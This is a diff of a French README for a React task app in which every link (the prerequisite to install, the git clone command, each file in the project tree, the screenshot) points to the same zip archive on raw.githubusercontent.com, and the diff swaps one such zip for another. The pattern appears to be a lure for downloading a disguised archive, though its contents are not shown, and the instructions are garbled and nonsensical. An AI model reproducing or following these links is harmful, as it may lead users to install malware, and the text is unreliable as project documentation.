@@ -10,7 +10,7 @@
 
 ## ⚡ Prérequis
 
-Avant de commencer, assurez-vous que vous avez installé [https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip](https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip) 🖥️. Ce projet utilise également **Tailwind CSS** 🌟 pour le style.
+Avant de commencer, assurez-vous que vous avez installé [https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip](https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip) 🖥️. Ce projet utilise également **Tailwind CSS** 🌟 pour le style.
 
 ## 🔧 Installation
 
@@ -19,7 +19,7 @@ Avant de commencer, assurez-vous que vous avez installé [https://raw.githubuser
 Clonez le repository de **React-Taskers** depuis GitHub :
 
 ```bash
-git clone https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip
+git clone https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip
 ```
 
 ### 2. Accédez au projet et installez les dépendances
@@ -55,23 +55,23 @@ Voici la structure de base du projet :
 /react-taskers
   /src
     /components
-      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip        # Composant représentant une tâche
-      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip    # Composant listant toutes les tâches
-      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip     # Composant pour ajouter une nouvelle tâche
-      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip      # Composant pour filtrer les tâches
+      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip        # Composant représentant une tâche
+      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip    # Composant listant toutes les tâches
+      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip     # Composant pour ajouter une nouvelle tâche
+      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip      # Composant pour filtrer les tâches
     /assets
-      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip       # Logo de l'application (si nécessaire)
-    - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip           # Point d'entrée de l'application
-    - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip         # Fichier principal de rendu React
+      - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip       # Logo de l'application (si nécessaire)
+    - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip           # Point d'entrée de l'application
+    - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip         # Fichier principal de rendu React
   /public
-    - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip       # Page HTML principale
+    - https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip       # Page HTML principale
 ```
 
 ## 🖼️ Exemple de Capture d'écran
 
 Voici à quoi ressemble l'interface de l'application :
 
-![Aperçu de React-Taskers](https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/src/components/React-Tasker-v2.1.zip)
+![Aperçu de React-Taskers](https://raw.githubusercontent.com/Martialdepaul/React-Tasker/main/public/Tasker_React_v2.0.zip)
 
 ## 🤝 Contribuer
 
